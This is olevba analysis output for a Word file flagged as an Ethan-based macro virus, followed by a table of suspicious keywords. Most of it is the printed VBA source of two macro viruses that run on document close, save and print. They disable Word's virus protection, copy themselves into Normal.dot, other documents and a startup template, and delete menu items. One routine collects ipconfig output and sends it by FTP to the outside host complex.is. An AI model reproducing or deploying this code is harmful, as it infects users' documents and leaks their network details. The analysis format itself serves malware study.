olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan-based-7ff4f3aac8c0279b9b71dbeba60bff3f795bd1b8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan-based-7ff4f3aac8c0279b9b71dbeba60bff3f795bd1b8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
s = ActiveDocument.Saved
Application.EnableCancelKey = Not -1
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
Randomize
If Dir("c:\ethan.___", 6) = "" Then
Open "c:\ethan.___" For Output As #1
For I = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(I, 1)
Print #1, a
Next I
Close #1
SetAttr "c:\ethan.___", 6
End If
If Dir("c:\class.sys") <> "" Then Kill "c:\class.sys"
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set t = NormalTemplate.VBProject.VBComponents.Item(1)
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set t = ActiveDocument.VBProject.VBComponents.Item(1)
Else
t = ""
End If
If t <> "" Then
Open "c:\ethan.___" For Input As #1
If LOF(1) = 0 Then GoTo q
I = 1
Do While Not EOF(1)
Line Input #1, a
t.CodeModule.InsertLines I, a
I = I + 1
Loop
q:
Close #1
If Rnd < 0.3 Then With Dialogs(wdDialogFileSummaryInfo): .Title = "Ethan Frome": .Author = "EW/LN/CB": .Keywords = "Ethan": .Execute: End With
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
End Sub
Sub AutoClose()
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
On Error GoTo out
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
Options.VirusProtection = False
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
Options.SaveNormalPrompt = False
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
Options.ConfirmConversions = False
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
If nt > 70 And ad > 0 Then GoTo out
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
If nt < 70 Then
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
End If
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
host.CodeModule.AddFromFile ("c:\class.sys")
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
With host.CodeModule
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
    For x = 1 To 4
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
    .deletelines 1
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
    Next x
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
End With
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
If nt < 70 Then
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
    With host.CodeModule
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
    .replaceline 1, "Sub AutoClose()"
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
    .replaceline 91, "Sub ToolsMacro()"
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
    For x = 70 To 81
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
        .deletelines 62
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
    Next x
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
    .replaceline 35, "    For x = 1 To 4"
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
    End With
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
End If
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
With host.CodeModule
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
    For x = 2 To 104 Step 2
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
    Next x
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
End With
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
out:
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
End Sub
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
Sub ToolsMacro()
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
End Sub
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
On Error Resume Next
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
Application.EnableCancelKey = Not -1
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
Randomize
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
Open "c:\ethan.___" For Output As #1
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(I, 1)
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
Next I
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
SetAttr "c:\ethan.___", 6
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
If Dir("c:\class.sys") <> "" Then Kill "c:\class.sys"
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
Set t = NormalTemplate.VBProject.VBComponents.Item(1)
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
Set t = ActiveDocument.VBProject.VBComponents.Item(1)
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
t = ""
'sec5/4/99 9:23:16 AMHP LaserJet 5P on \\CLAN\LJ5P-Qmahindra - new1
If t <> "" Then
Open "c:\ethan.___" For Input As #1
If LOF(1) = 0 Then GoTo q
I = 1
Do While Not EOF(1)
Line Input #1, a
t.CodeModule.InsertLines I, a
I = I + 1
Loop
q:
Close #1
If Rnd < 0.3 Then With Dialogs(wdDialogFileSummaryInfo): .Title = "Ethan Frome": .Author = "EW/LN/CB": .Keywords = "Ethan": .Execute: End With
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
End Sub
-------------------------------------------------------------------------------
VBA MACRO groovie.bas 
in file: Virus.MSWord.Ethan-based-7ff4f3aac8c0279b9b71dbeba60bff3f795bd1b8 - OLE stream: 'Macros/VBA/groovie'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public WhoAmI As String
Public DataDot As Boolean
Public NormInstalled As Boolean
Public DocInstalled As Boolean
Public NormReadOnly As Boolean
Public HoldDoc As String
Public DocThere As Boolean
Public Final_Close_Called As Boolean
Function ID_Status()
On Error Resume Next
    If MacroContainer = NormalTemplate Then
        WhoAmI = "normal"
        GoTo checkout
    End If
    If MacroContainer = ActiveDocument Then WhoAmI = "document"
    If MacroContainer = "data.dot" Then WhoAmI = "orbit"
checkout:
End Function
Function Install_Status()
On Error Resume Next
    If Dir(Application.StartupPath + "\data.dot") = "data.dot" Then DataDot = True
    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "groovie" Then DocInstalled = True
    Next I
    For I = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(I).Name = "groovie" Then NormInstalled = True
    Next I
    If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Or _
    GetAttr(NormalTemplate.FullName) = vbReadOnly Then NormReadOnly = True
End Function
Function The_Groovie_Core()
On Error Resume Next
Call ID_Status
Call Install_Status
    If WhoAmI = "document" Then Call DocCodeCore
    If WhoAmI = "normal" Then Call NormCodeCore
    If WhoAmI = "orbit" Then Call OrbitCoreCode
    If NormReadOnly = False Then CommandBars("tools").Controls("Macro").Delete
    If NormReadOnly = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
End Function
Function DocCodeCore()
On Error Resume Next
    Application.VBE.ActiveVBProject.VBComponents("groovie").Export "c:\groovie.sys"
    If NormInstalled = False And NormReadOnly = False Then
        With NormalTemplate.VBProject
        With .VBComponents.Import("c:\groovie.sys")
        End With
        End With
    End If
    If DataDot = False Then
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
        If Final_Close_Called = False Then Documents.Open FileName:=HoldDoc
        Shell ("label c: groovie"), 0
        Windows(1).Close
    End If
End Function
Function NormCodeCore()
On Error Resume Next
Application.ScreenUpdating = False
    Call Check_For_Doc
    If DocInstalled = False And DocThere = True Then
        With ActiveDocument.VBProject
        With .VBComponents.Import("c:\groovie.sys")
        End With
        End With
        With Dialogs(wdDialogFileSummaryInfo)
            .Comments = "ALT-F11 says it's groovie!"
            .Execute
        End With
    End If
    If DataDot = False And DocThere = True Then
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        If Final_Close_Called = False Then Documents.Open FileName:=HoldDoc
        Windows(1).Close SaveChanges:=wdSaveChanges
    End If
    If DataDot = False And DocThere = False Then
        Documents.Add Template:="", NewTemplate:=False
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
        Windows(1).Close SaveChanges:=wdSaveChanges
    End If
Application.ScreenUpdating = True
End Function
Function OrbitCoreCode()
On Error Resume Next
Application.ScreenUpdating = False
        If NormInstalled = False And NormReadOnly = False Then
            With NormalTemplate.VBProject
            With .VBComponents.Import("c:\groovie.sys")
            End With
            End With
            NormalTemplate.Save
        End If
        If DocInstalled = False Then
            With ActiveDocument.VBProject
            With .VBComponents.Import("c:\groovie.sys")
            End With
            End With
            With Dialogs(wdDialogFileSummaryInfo)
                .Comments = "ALT-F11 says it's groovie!"
                .Execute
            End With
        End If
Application.ScreenUpdating = True
End Function
Function Groovie_Run()
On Error Resume Next
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Options.ConfirmConversions = False
    HoldDoc = ActiveDocument.FullName
    Call The_Groovie_Core
    Randomize
    rn = Int(Rnd * 5)
    If rn = 3 Then Call IP_Love_You
End Function
Sub AutoClose()
On Error Resume Next
Final_Close_Called = True
Call Groovie_Run
End Sub
Sub AutoExit()
On Error Resume Next
Final_Close_Called = True
Call Groovie_Run
End Sub
Sub FileSaveAs()
On Error Resume Next
Call Groovie_Run
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub filesave()
On Error Resume Next
Call Groovie_Run
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub
Sub fileclose()
On Error Resume Next
Final_Close_Called = True
Call Groovie_Run
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
ActiveDocument.Close
End Sub
Sub fileprint()
On Error Resume Next
Call Groovie_Run
Dialogs(wdDialogFilePrint).Show
End Sub
Function IP_Love_You()
On Error Resume Next
    Shell ("ipconfig /all /batch c:\ip.txt"), 0
    Call mscript("c:\script.sys")
    Shell ("ftp -s:c:\script.sys complex.is"), 0
End Function
Function mscript(strFile As String)
Randomize
On Error Resume Next
    one = Application.UserName
    two = Application.UserInitials
    rn = Int(Rnd * 999)
    Dim hFile As Long
    hFile = FreeFile
Open strFile For Output Access Write As hFile
    Print #hFile, "anonymous"
    Print #hFile, one & "@" & two & ".com"
    Print #hFile, "cd incoming"
    Print #hFile, "send"
    Print #hFile, "c:\ip.txt"
    Print #hFile, rn + rn & "." & two
    Print #hFile, "quit"
Close hFile
End Function
Sub viewvbcode()
MsgBox "It's GROOVIE", vbOKOnly, "•  ALT-F11  • says..."
End Sub
Sub ToolsMacro()
End Sub
Sub FileTemplates()
End Sub
Function Check_For_Doc()
On Error GoTo docek
    If ActiveDocument.Name <> "" Then
        DocThere = True
    End If
    GoTo over
docek:
    DocThere = False
over:
End Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

